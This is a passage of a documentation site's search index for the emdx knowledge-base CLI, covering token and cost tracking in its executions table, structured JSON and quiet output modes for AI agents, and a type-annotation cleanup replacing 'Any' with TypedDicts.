output_tokens / tokens_used","text":""},{"location":"articles/inputtokens-outputtokens-tokensused/#overview","title":"Overview","text":"<p>The emdx project tracks token usage and API costs for delegate executions at the database level. Three key metrics are stored in the <code>executions</code> table: <code>input_tokens</code>, <code>output_tokens</code>, and <code>tokens_used</code> (total tokens). These fields enable cost tracking, usage analytics, and execution monitoring across the system.</p> <p>Key insight: Token data is only written after execution completes \u2014 all three fields remain at their default values (0) while a delegate is running.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/inputtokens-outputtokens-tokensused/#token-metrics-definition","title":"Token Metrics Definition","text":"Metric Type Purpose <code>input_tokens</code> INTEGER Number of tokens sent to the Claude API (prompt + context) <code>output_tokens</code> INTEGER Number of tokens generated by Claude (response) <code>tokens_used</code> INTEGER Total tokens consumed (<code>input_tokens + output_tokens</code>) <code>cost_usd</code> REAL Actual cost in USD based on model pricing <p>These metrics are central to understanding delegate resource consumption and providing transparency around API costs.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#data-lifecycle","title":"Data Lifecycle","text":"<pre><code>1. Execution created \u2192 cost/token fields set to 0\n2. Delegate runs \u2192 fields remain 0 (no live updates)\n3. Delegate completes \u2192 unified_executor.py writes all metrics in one atomic update\n4. Dashboard/status displays completed execution with full cost data\n</code></pre>"},{"location":"articles/inputtokens-outputtokens-tokensused/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/inputtokens-outputtokens-tokensused/#schema-evolution","title":"Schema Evolution","text":"<p>The token tracking fields were added in migration 036 (<code>migration_036_add_execution_metrics</code>):</p> <pre><code># Migration 036 added to executions table:\ntask_id INTEGER REFERENCES tasks(id)\ncost_usd REAL DEFAULT 0.0\ntokens_used INTEGER DEFAULT 0\ninput_tokens INTEGER DEFAULT 0\noutput_tokens INTEGER DEFAULT 0\n</code></pre> <p>This migration was part of the broader execution metrics tracking initiative that also linked executions back to tasks.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#schema-model-synchronization-issues","title":"Schema-Model Synchronization Issues","text":"<p>Historical bug (MEDIUM severity): The <code>Execution</code> dataclass was initially missing these fields after migration 036 was applied, causing a schema-model mismatch. This was identified in multiple technical debt audits:</p> <ul> <li>Functions could write the data via dynamic <code>update_execution()</code> but couldn't read it back</li> <li>The dataclass always returned default values (0) even when database had real data</li> <li>Fixed in PR #487, PR #509, PR #561 by adding the 6 missing fields to the dataclass</li> </ul>"},{"location":"articles/inputtokens-outputtokens-tokensused/#data-availability-constraint","title":"Data Availability Constraint","text":"<p>Token data is only available post-completion because: - The Claude API returns usage data in the final response - Streaming responses don't provide incremental token counts - Cost calculation requires knowing the final model and token counts</p> <p>Implication for dashboards: A \"running delegates\" view cannot show accurate cost/token data \u2014 those cells must remain empty or show \"\u2014\" until completion.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#single-write-pattern","title":"Single-Write Pattern","text":"<p>All token metrics are written in a single atomic update in <code>unified_executor.py</code> (lines 474-487):</p> <pre><code>update_execution(\n    exec_id,\n    cost_usd=result.cost_usd,\n    tokens_used=result.tokens_used,\n    input_tokens=result.input_tokens,\n    output_tokens=result.output_tokens,\n)\n</code></pre> <p>This guarantees consistency \u2014 you never have a partial state where <code>input_tokens</code> is set but <code>output_tokens</code> is missing.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#type-safety-journey","title":"Type Safety Journey","text":"<p>The project underwent multiple iterations to achieve type safety for execution results:</p> <ol> <li>Initial state: <code>ExecutionResult.to_dict()</code> returned <code>dict[str, Any]</code></li> <li>Type safety audit (2026-02-15): Identified this as an actionable improvement</li> <li>PR #696, #697: Added <code>ExecutionResultDict</code> TypedDict to <code>emdx/services/types.py</code></li> <li>Duplicate PR incident: Both #697 and #698 merged, causing <code>mypy error: no-redef</code> on main</li> <li>Resolution: Deduplication and standardization on <code>ExecutionResultDict</code></li> </ol> <p>Current definition in <code>emdx/services/types.py</code>:</p> <pre><code>class ExecutionResultDict(TypedDict):\n    \"\"\"Serialized execution result from UnifiedExecutor.\"\"\"\n    success: bool\n    execution_id: int\n    log_file: str\n    output_doc_id: int | None\n    output_content: str | None\n    tokens_used: int\n    input_tokens: int\n    output_tokens: int\n    cost_usd: float\n    execution_time_ms: int\n    error_message: str | None\n    exit_code: int | None\n    cli_tool: str\n</code></pre>"},{"location":"articles/inputtokens-outputtokens-tokensused/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/inputtokens-outputtokens-tokensused/#execution-model","title":"Execution Model","text":"<p>Located in <code>emdx/models/executions.py</code>, the dataclass now correctly includes all token fields:</p> <pre><code>@dataclass\nclass Execution:\n    id: int\n    doc_id: Optional[int]\n    doc_title: str\n    status: str\n    started_at: datetime\n    completed_at: Optional[datetime]\n    log_file: str\n    exit_code: Optional[int]\n    working_dir: Optional[str]\n    pid: Optional[int]\n    cascade_run_id: Optional[int] = None\n    task_id: Optional[int] = None\n    cost_usd: float = 0.0\n    tokens_used: int = 0\n    input_tokens: int = 0\n    output_tokens: int = 0\n</code></pre>"},{"location":"articles/inputtokens-outputtokens-tokensused/#query-pattern","title":"Query Pattern","text":"<p>All functions that query executions use a shared column list <code>_EXECUTION_COLUMNS</code> (refactored for consistency):</p> <pre><code>_EXECUTION_COLUMNS = \"\"\"\n    id, doc_id, doc_title, status, started_at, completed_at,\n    log_file, exit_code, working_dir, pid, cascade_run_id,\n    task_id, cost_usd, tokens_used, input_tokens, output_tokens\n\"\"\"\n</code></pre> <p>Helper function <code>_row_to_execution(row)</code> parses SQLite rows with backward compatibility for legacy DBs missing the newer columns.</p> <p>Functions using this pattern: - <code>get_execution(exec_id)</code> \u2014 Fetch single execution by ID - <code>get_recent_executions(limit)</code> \u2014 Recent executions ordered by start time - <code>get_running_executions()</code> \u2014 Active delegates (status='running') - <code>get_stale_executions(timeout_minutes)</code> \u2014 Delegates exceeding timeout threshold</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#status-display","title":"Status Display","text":"<p>The <code>emdx exec health</code> command provides the richest view of running delegates:</p> Column Source ID <code>executions.id</code> Title <code>executions.doc_title</code> PID <code>executions.pid</code> CPU/MEM <code>psutil.Process(pid)</code> (live) Runtime <code>now - executions.started_at</code> (computed) Health <code>Execution.is_zombie</code> property (PID check via <code>os.kill(pid, 0)</code>) <p>The <code>emdx status</code> command currently uses the tasks table, not <code>executions</code>, to show active delegates.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#cost-estimation","title":"Cost Estimation","text":"<p>The <code>synthesis_service.py</code> provides pre-execution cost estimates via <code>estimate_cost()</code>:</p> <pre><code>def estimate_cost(self, doc_ids: list[int]) -&gt; dict[str, float | int]:\n    # Returns:\n    # {\n    #   \"input_tokens\": int,\n    #   \"output_tokens\": int,\n    #   \"estimated_cost\": float\n    # }\n</code></pre> <p>Type safety note: The return type uses <code>dict[str, float | int]</code> instead of a TypedDict. A <code>CostEstimate</code> TypedDict was proposed in the 2026-02-15 audit but not yet implemented:</p> <pre><code>class CostEstimate(TypedDict):\n    input_tokens: int\n    output_tokens: int\n    estimated_cost: float\n</code></pre>"},{"location":"articles/inputtokens-outputtokens-tokensused/#related-topics","title":"Related Topics","text":""},{"location":"articles/inputtokens-outputtokens-tokensused/#database-foreign-keys","title":"Database Foreign Keys","text":"<p>The <code>task_id</code> column added in migration 036 links executions back to the task system. This enables: - Grouping executions by task in the Activity screen - Tracking task-level cumulative costs - Linking delegate output documents to their creating tasks</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#execution-heartbeat-deprecated","title":"Execution Heartbeat (Deprecated)","text":"<p>Earlier versions tracked liveness via a <code>last_heartbeat</code> column (migration 005), but this was dropped in migration 013 when the executions table was recreated. Functions like <code>update_execution_heartbeat()</code> and <code>get_stale_executions()</code> originally relied on this column but now use PID-based detection instead.</p> <p>The heartbeat functionality was restored in migration 037 (PR #509) but is no longer actively used \u2014 PID checks via <code>Execution.is_zombie</code> are more reliable.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#migration-integrity","title":"Migration Integrity","text":"<p>Migration 038 fixed orphan-prone foreign keys on related tables (<code>gists</code>, <code>gdocs</code>, <code>export_history</code>, <code>cascade_runs</code>) by adding <code>ON DELETE CASCADE</code> or <code>ON DELETE SET NULL</code> behavior. This prevents orphaned execution records when parent documents or tasks are deleted.</p>"},{"location":"articles/inputtokens-outputtokens-tokensused/#type-safety-audit-context","title":"Type Safety Audit Context","text":"<p>The token tracking fields were part of a broader type safety initiative in February 2026:</p> <ul> <li>Phase 1: Identified 8+ functions returning <code>dict[str, Any]</code> with known shapes</li> <li>Phase 2: Created TypedDicts in <code>emdx/services/types.py</code> for structured data</li> <li>Phase 3: Fixed schema-model mismatches across executions, tasks, and cascade systems</li> </ul> <p>The <code>ExecutionResultDict</code> TypedDict was one outcome, ensuring compile-time type checking for all execution result consumers.</p> <p>Generated from 19 source documents</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/","title":"--json: emdx agent and emdx agent instructions","text":"<p>I'll synthesize these 11 documents into a comprehensive wiki article about --json, emdx agent, and emdx agent instructions.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#-json-emdx-agent-and-emdx-agent-instructions","title":"--json: emdx agent and emdx agent instructions","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#overview","title":"Overview","text":"<p>EMDX operates as a dual-interface knowledge layer that serves both human developers and AI agents through different output modes. The <code>--json</code> flag represents the agent lens into the system, while rich tables and TUI provide the human interface. This design principle\u2014same commands, different output modes\u2014allows EMDX to function as persistent memory for AI-assisted development.</p> <p>The system's identity has evolved from a personal knowledge base CLI into an agent-accessible knowledge layer where AI agents populate structured content that humans curate and direct across sessions.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#dual-interface-design","title":"Dual-Interface Design","text":"<p>EMDX serves two distinct user types with fundamentally different interaction patterns:</p> Dimension Human Pattern Agent Pattern Content lifecycle Iterative, multi-edit Single creation, immutable Navigation Browse \u2192 discover \u2192 narrow Queue \u2192 execute \u2192 next Structure need Hierarchical (cognitive scaffolding) Flat (work queue) Output format Rich, visual, colored Structured, parseable Session model Exploratory, context-switching Linear task execution"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#output-modes","title":"Output Modes","text":"<p>EMDX implements four output modes to serve different use cases:</p> Flag Purpose Use Case (default) Human-friendly Rich output Interactive terminal use <code>--json</code> Full structured output Agent consumption, scripting <code>--quiet</code> / <code>-q</code> Minimal output (just IDs) Piping to next command <code>--porcelain</code> Stable machine-parseable text Scripts needing stability guarantees <p>The system uses layered detection to determine the appropriate mode: 1. Explicit flags (<code>--json</code>, <code>--quiet</code>) take precedence 2. Environment variables provide signals from agent runtime 3. TTY detection offers sensible defaults for non-interactive contexts</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#the-delegate-pattern","title":"The Delegate Pattern","text":"<p><code>emdx delegate</code> serves as the primary agent interface, acting as a bridge between Claude Code and the knowledge base:</p> <pre><code># Single task \u2014 results print AND persist\nemdx delegate \"audit auth for vulnerabilities\"\n\n# Parallel execution (up to 10 concurrent)\nemdx delegate \"check auth\" \"review tests\" \"scan for XSS\"\n\n# Synthesize results into coherent document\nemdx delegate --synthesize \"analyze auth\" \"analyze api\" \"analyze db\"\n\n# Feed document as context\nemdx delegate --doc 47 \"write an action plan from this analysis\"\n\n# Code changes with auto-PR\nemdx delegate --pr \"fix the auth bug\"\n</code></pre> <p>The delegate command: - Wraps Claude execution with KB persistence - Auto-creates tasks and tracks executions - Handles parallel, sequential, and discovery modes - Creates artifacts that persist beyond conversation</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#strategic-positioning","title":"Strategic Positioning","text":"<p>In a landscape where every major AI coding tool (Claude Code, Cursor, Windsurf, Devin) now has persistent memory, EMDX's differentiation centers on who controls it and how it's accessed:</p> <p>The Moat: 1. Tool-agnostic persistence: Works with any AI, not locked to specific vendors 2. Human-readable and searchable: Not opaque JSON buried in hidden directories 3. Dual-interface design: Same data, different lenses 4. Workflow-aware: Supports the agent\u2192human\u2192agent handoff pattern explicitly</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#why-not-agent-workspace","title":"Why Not \"Agent Workspace\"?","text":"<p>Critical analysis revealed that while usage patterns show heavy agent activity, positioning as an \"agent workspace\" would be strategically problematic:</p> <ul> <li>Survivorship bias: Primary user is building agent features, skewing usage data</li> <li>The KB IS the moat: Agents are commoditizing; persistent, searchable knowledge is rare</li> <li>Identity drift risk: \"Agent workspace\" makes EMDX sound like \"yet another AI dev tool\"</li> <li>Alternative framing: \"EMDX is a knowledge base that agents can read and write\" keeps KB central</li> </ul>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#patterns-from-other-tools","title":"Patterns from Other Tools","text":"<p>The dual-interface architecture draws from proven CLI tools:</p> <p>Git's Porcelain Pattern:</p> <pre><code>git status              # Human: \"On branch main, nothing to commit\"\ngit status --porcelain  # Machine: \"?? newfile.txt\" (stable format)\n</code></pre> <p>Ripgrep's Structured Output:</p> <pre><code>rg \"pattern\" --json     # Each match as JSON object (JSON Lines format)\nrg \"pattern\" --quiet    # Exit code only, no output\n</code></pre> <p>gh CLI's Template-Based Formatting:</p> <pre><code>gh pr list --json number,title,author\ngh pr list --json number,title --jq '.[].number'\n</code></pre>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#agent-detection-implementation","title":"Agent Detection Implementation","text":"<pre><code>def is_agent_context() -&gt; bool:\n    \"\"\"Detect if running in an AI agent context.\"\"\"\n    if os.environ.get(\"CLAUDECODE\") == \"1\":\n        return True\n    if os.environ.get(\"EMDX_AGENT_MODE\") == \"1\":\n        return True\n    if not sys.stdin.isatty() and not sys.stdout.isatty():\n        return True\n    return False\n</code></pre>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#structured-error-output","title":"Structured Error Output","text":"<p>When <code>--json</code> is specified, errors output as structured data:</p> <pre><code>{\n  \"success\": false,\n  \"error\": {\n    \"code\": \"DOCUMENT_NOT_FOUND\",\n    \"message\": \"Document with ID 999 not found\",\n    \"details\": {\"requested_id\": 999}\n  }\n}\n</code></pre> <p>Error codes follow HTTP-like semantics: - <code>INVALID_INPUT</code>, <code>DOCUMENT_NOT_FOUND</code>, <code>PERMISSION_DENIED</code> (4xx equivalent) - <code>DATABASE_ERROR</code>, <code>NETWORK_ERROR</code>, <code>UNKNOWN_ERROR</code> (5xx equivalent)</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#outputmode-enum","title":"OutputMode Enum","text":"<pre><code>from enum import Enum\n\nclass OutputMode(Enum):\n    HUMAN = \"human\"      # Rich tables, colors, emojis\n    JSON = \"json\"        # Full structured JSON\n    QUIET = \"quiet\"      # Just essential values (IDs)\n    PORCELAIN = \"porcelain\"  # Stable text format, no breaking changes\n\ndef detect_output_mode(\n    json_flag: bool = False,\n    quiet_flag: bool = False,\n    porcelain_flag: bool = False,\n    auto_detect: bool = True\n) -&gt; OutputMode:\n    \"\"\"Determine output mode from flags and environment.\"\"\"\n    if json_flag:\n        return OutputMode.JSON\n    if quiet_flag:\n        return OutputMode.QUIET\n    if porcelain_flag:\n        return OutputMode.PORCELAIN\n\n    if auto_detect and not sys.stdout.isatty():\n        return OutputMode.QUIET\n\n    return OutputMode.HUMAN\n</code></pre>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#commandresult-pattern","title":"CommandResult Pattern","text":"<pre><code>@dataclass\nclass CommandResult:\n    success: bool\n    data: dict | None = None\n    error: dict | None = None\n\n    def output(self, mode: OutputMode) -&gt; None:\n        if mode == OutputMode.JSON:\n            print(json.dumps(asdict(self)))\n        elif mode == OutputMode.QUIET:\n            if self.success and self.data and \"id\" in self.data:\n                print(self.data[\"id\"])\n            elif not self.success:\n                sys.exit(1)\n        else:\n            # Human output via Rich\n            ...\n</code></pre>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#standardized-exit-codes","title":"Standardized Exit Codes","text":"Code Meaning 0 Success 1 General error 2 Invalid arguments/input 3 Resource not found 4 Permission denied 5 Network/external service error"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#environment-variables","title":"Environment Variables","text":"Variable Purpose <code>CLAUDECODE=1</code> Claude Code is running (auto-set) <code>EMDX_AGENT_MODE=1</code> Generic agent mode marker <code>EMDX_OUTPUT_MODE=json\\|quiet\\|porcelain</code> Override default output mode <code>EMDX_NO_COLOR=1</code> Disable color output <code>EMDX_NO_PAGER=1</code> Disable pager"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#what-changes-for-agents-default-behavior","title":"What Changes for Agents (Default Behavior)","text":"Behavior Human Default Agent Default Output mode Rich tables Quiet (IDs only) Confirmations Prompt user Skip (assume yes) Pager Use for long output No pager Progress bars Show spinners Hide or minimal Color Auto (term-aware) Off <p>Critical principle: These are defaults, not mandates. Explicit flags always override.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#agent-workflow-integration","title":"Agent Workflow Integration","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#session-start-protocol","title":"Session Start Protocol","text":"<pre><code>emdx prime    # Get current work context (ready tasks, in-progress, recent docs)\nemdx status   # Quick overview\n</code></pre> <p>With hooks active in Claude Code, <code>emdx prime</code> runs automatically on session start.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#briefing-system","title":"Briefing System","text":"<pre><code>emdx briefing                        # What happened in last 24h\nemdx briefing --since \"2 days ago\"\nemdx briefing --save                 # AI summary, persisted to KB\n</code></pre> <p>This addresses the critical gap: humans need to consume what agents produced across sessions.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#review-queue-workflow","title":"Review Queue Workflow","text":"<p>Future implementation to support agent\u2192human\u2192agent handoffs:</p> <pre><code>emdx review list                     # Show items awaiting human decision\nemdx review approve 42\nemdx review reject 42 --reason \"focus on security first\"\n</code></pre>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#continue-with-feedback-pattern","title":"Continue-with-Feedback Pattern","text":"<p>Planned feature for iterative agent work:</p> <pre><code>emdx delegate --continue-from 42 --feedback \"prioritize performance over readability\"\n</code></pre>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#missing-features-analysis","title":"Missing Features Analysis","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#for-humans-consuming-agent-output","title":"For Humans (consuming agent output)","text":"<ul> <li>Briefing system: Synthesize what happened across sessions (<code>emdx briefing --since</code>)</li> <li>Activity feeds: Semantic grouping by session/topic, not flat chronological</li> <li>Quality signals: No way to mark \"verified by human\" vs \"agent draft\"</li> <li>Diff/delta views: Document evolution tracking</li> </ul>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#for-agents-efficient-operation","title":"For Agents (efficient operation)","text":"<ul> <li>Semantic context injection: <code>--context \"topic\"</code> auto-selects relevant docs</li> <li>Structured schemas: Validation for agent outputs</li> <li>Relationship tracking: Explicit links between documents</li> <li>Agent memory: Learning from similar past tasks</li> </ul>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#for-handoffs-the-critical-gap","title":"For Handoffs (the critical gap)","text":"<ul> <li>Review queue: First-class pending\u2192approved/rejected workflow</li> <li>Structured review requests: Agent asks specific questions</li> <li>Continue pattern: Resume with human feedback incorporated</li> <li>Notification system: Escalation and priority handling</li> </ul> <p>The biggest gap: EMDX treats documents as isolated artifacts, but the workflow connecting them is implicit.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#implementation-roadmap","title":"Implementation Roadmap","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#phase-1-foundation-immediate","title":"Phase 1: Foundation (Immediate)","text":"<ol> <li>Create <code>OutputMode</code> enum and <code>detect_output_mode()</code> utility</li> <li>Add <code>--json</code>, <code>-q</code>, <code>--porcelain</code> as global CLI options</li> <li>Standardize structured error output with error codes</li> <li>Migrate high-traffic commands: <code>save</code>, <code>find</code>, <code>view</code>, <code>tag</code>, <code>prime</code></li> </ol>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#phase-2-consistency-near-term","title":"Phase 2: Consistency (Near-term)","text":"<ol> <li>Structured errors everywhere</li> <li>Standardize all list/search commands for JSON output</li> <li>Document porcelain formats as versioned API</li> <li>Implement <code>emdx briefing --since</code> for human consumption</li> <li>Add review queue workflow</li> </ol>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#phase-3-advanced-future","title":"Phase 3: Advanced (Future)","text":"<ol> <li>JSON input support (<code>--from-json</code> for complex operations)</li> <li>Semantic context injection (<code>--context</code> flag)</li> <li>Structured output schemas with validation</li> <li>Continue-with-feedback pattern</li> <li>Agent memory/learning system</li> </ol>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#design-principles","title":"Design Principles","text":"<p>The dual-interface architecture follows these core principles:</p> <ol> <li>Explicit beats implicit \u2014 Flags override auto-detection</li> <li>Humans are the default \u2014 Don't optimize for machines at human expense</li> <li>Stability promises \u2014 Porcelain formats are versioned API contracts</li> <li>Fail loudly \u2014 Structured errors with codes, not silent failures</li> <li>Pipe-friendly \u2014 Every command that outputs data should be pipeable</li> <li>Composable \u2014 Commands work together via stdin/stdout</li> <li>Workflow, not just artifacts \u2014 Support the full cycle, not just storage</li> </ol>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#related-topics","title":"Related Topics","text":""},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#competitive-landscape-2025-2026","title":"Competitive Landscape (2025-2026)","text":"<p>MCP as Universal Standard: Model Context Protocol has become industry standard, with Google, Microsoft, AWS, and OpenAI all supporting it. By 2026, 75% of API gateway vendors will have MCP features.</p> <p>Memory is Table Stakes: Every major coding agent now has persistent state: - Claude Code: Task system with DAGs, resumable subagents, memory files - Cursor: Persistent knowledge base, automatically generated memories - Windsurf: User-generated and automatically generated memory systems - Devin: Automatic repository indexing with architecture diagrams</p> <p>Agent Workspaces Emerging: Google Workspace Studio, Amazon Bedrock AgentCore, Microsoft agent workspaces all provide dedicated environments for agent operation.</p> <p>Graph-Based Orchestration: LangGraph's checkpoint model becoming production standard, with PostgreSQL persistence used at LinkedIn, Uber, and 400+ companies.</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#why-hierarchy-serves-both-humans-and-agents","title":"Why Hierarchy Serves Both Humans and Agents","text":"<p>For Humans: - Cognitive scaffolding for limited working memory (Miller's 7\u00b12 items) - Navigation by recognition vs recall - Context maintenance (\"I'm working on SEC stuff\") - Scope communication (\"The auth epic is 80% done\")</p> <p>For Agents: - Semantic compression for context windows - Scoped queries for efficiency - Delegated authority patterns (\"handle all SEC tasks autonomously\")</p>"},{"location":"articles/json-emdx-agent-and-emdx-agent-instructions/#the-positioning-statement","title":"The Positioning Statement","text":"<p>\"EMDX is the knowledge layer for AI-assisted development\u2014a persistent, searchable, human-controllable system that any agent can read from and write to.\"</p> <p>This positions EMDX as infrastructure, not just another tool. It's the memory that makes agent work valuable beyond single sessions.</p> <p>Generated from 11 source documents</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/","title":"**kwargs: Any, TYPE_CHECKING, and Any Type Removal Analysis","text":""},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#overview","title":"Overview","text":"<p>The emdx codebase contained 157+ occurrences of <code>Any</code> type annotations across UI components, services, commands, models, and database layers. A systematic audit identified concrete replacements for approximately 88% of these uses while preserving legitimate <code>Any</code> usage where dynamic typing serves the codebase. The work was completed in four phases, delivering improved IDE autocomplete, static type checking, and documented data contracts with zero runtime cost.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#legitimate-any-usage-patterns","title":"Legitimate Any Usage Patterns","text":""},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#textual-widget-framework-convention","title":"Textual Widget Framework Convention","text":"<p>Textual widgets follow the idiomatic pattern <code>__init__(*args: Any, **kwargs: Any)</code> to pass arbitrary keyword arguments up the inheritance chain. This appears in 30+ locations across UI components and is explicitly acceptable per CLAUDE.md typing guidelines:</p> <pre><code># Acceptable \u2014 Textual framework convention\nclass SearchScreen(Screen):\n    def __init__(self, *args: Any, **kwargs: Any) -&gt; None:\n        super().__init__(*args, **kwargs)\n</code></pre> <p>Alternative: Replace with <code>object</code> for slightly better type safety while preserving flexibility:</p> <pre><code>def __init__(self, *args: object, **kwargs: object) -&gt; None:\n    super().__init__(*args, **kwargs)\n</code></pre> <p>Files affected: <code>text_areas.py</code>, <code>vim_line_numbers.py</code>, <code>log_browser.py</code>, <code>browser_container.py</code>, <code>search_screen.py</code>, <code>activity_view.py</code>, <code>group_picker.py</code>, <code>task_view.py</code>, <code>qa_screen.py</code>, <code>palette_screen.py</code>, <code>modals.py</code>, <code>vim_editor.py</code>, and others (~30 total).</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#dynamic-update-functions","title":"Dynamic Update Functions","text":"<p>Functions accepting arbitrary column updates legitimately use <code>**kwargs: Any</code>:</p> <pre><code># Intentional \u2014 forwards to dynamic SQL UPDATE\ndef update_task(task_id: int, **kwargs: Any) -&gt; bool:\n    ALLOWED_UPDATE_COLUMNS = {\n        \"title\", \"description\", \"priority\", \"status\", ...\n    }\n</code></pre> <p>Files: <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>database/groups.py</code>, <code>commands/delegate.py</code></p> <p>Python 3.12+ alternative (TypedDict with Unpack):</p> <pre><code>from typing import TypedDict, Unpack\n\nclass TaskUpdateKwargs(TypedDict, total=False):\n    title: str\n    description: str\n    priority: int\n    status: str\n    error: str | None\n\ndef update_task(task_id: int, **kwargs: Unpack[TaskUpdateKwargs]) -&gt; bool:\n</code></pre>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#json-serialization","title":"JSON Serialization","text":"<p>Functions serializing arbitrary data to JSON:</p> <pre><code>def print_json(data: Any) -&gt; None:\ndef _output_json(data: Any) -&gt; None:\n</code></pre> <p>Rationale: JSON serialization handles any serializable Python type. This is appropriate for output functions.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#cli-executor-streaming","title":"CLI Executor Streaming","text":"<p>The <code>cli_executor/</code> module handles polymorphic Claude CLI streaming output with 10+ message variants. Using <code>dict[str, Any]</code> is intentional here:</p> <pre><code># Genuinely polymorphic \u2014 many message types\nStreamLine = dict[str, Any]  # SystemMessage | AssistantMessage | ToolCall | ...\n</code></pre> <p>Alternative (union TypedDict): Possible but creates significant complexity for marginal benefit. Marked as intentional in codebase.</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#high-impact-replacements","title":"High-Impact Replacements","text":""},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#pattern-1-lazy-loaded-optional-dependencies-17-occurrences","title":"Pattern 1: Lazy-Loaded Optional Dependencies (17 occurrences)","text":"<p>Services lazy-load heavy dependencies (anthropic, sentence-transformers, watchdog) to avoid import-time overhead and runtime errors when packages aren't installed. Originally typed as <code>Any</code> to defer imports:</p> <p>Current pattern:</p> <pre><code>self._search_service: Any = None\nself._embedding_service: Any = None\nself._client: Any = None\n</code></pre> <p>Fix with TYPE_CHECKING guards:</p> <pre><code>from __future__ import annotations\nfrom typing import TYPE_CHECKING\n\nif TYPE_CHECKING:\n    from emdx.services.unified_search import UnifiedSearchService\n    from emdx.services.embedding_service import EmbeddingService\n    import anthropic\n\nclass MyService:\n    self._search_service: UnifiedSearchService | None = None\n    self._embedding_service: EmbeddingService | None = None\n    self._client: anthropic.Anthropic | None = None\n</code></pre> <p>Benefits: - Enables autocomplete and method call validation - Preserves lazy loading semantics - No runtime cost (imports only during type checking)</p> <p>Files affected: - <code>ask_service.py</code> (4 occurrences: <code>_client</code>, <code>_get_client</code> return, <code>client</code> property, SQL params) - <code>unified_search.py</code> (5 occurrences: <code>_embedding_service</code>, semantic matches, fuzzy results, popular tags) - <code>embedding_service.py</code> (4 occurrences: <code>_model</code>, <code>_load_model</code> return, <code>model</code> property) - <code>file_watcher.py</code> (2 occurrences: <code>Observer</code>, <code>FileSystemEvent</code>) - <code>search_presenter.py</code> (2 occurrences: <code>_search_service</code>, <code>search_service</code> property) - <code>palette_presenter.py</code> (1 occurrence: <code>_search_service</code>) - <code>qa_presenter.py</code> (2 occurrences: <code>_embedding_service</code>, lazy load pattern)</p> <p>Phase 1 completion: All services updated with TYPE_CHECKING guards. Test suite passed (1236 tests).</p>"},{"location":"articles/kwargs-any-typechecking-and-any-type-removal-analysis/#pattern-2-database-row-dictionaries-42-occurrences","title":"Pattern 2: Database Row Dictionaries (42 occurrences)","text":"<p>Database query results used <code>dict[str, Any]</code> when the schema was known. Replaced with TypedDicts for type safety and documentation:</p> <p>Current pattern:</p> <pre><code>def get_recent_pipeline_activity() -&gt; list[dict[str, Any]]:\ndef get_popular_tags() -&gt; list[dict[str, Any]]:\nself._selected_exec: dict[str, Any] | None = None\n</code></pre> <p>Fix with TypedDicts in <code>emdx/ui/types.py</code>:</p> <pre><code>from typing import TypedDict\n\nclass PipelineActivityDict(TypedDict, total=False):\n    exec_id: int\n    input_id: int\n    input_title: str\n    output_id: int | None\n    output_title: str | None\n    status: str\n    started_at: str\n    completed_at: str | None\n    log_file: 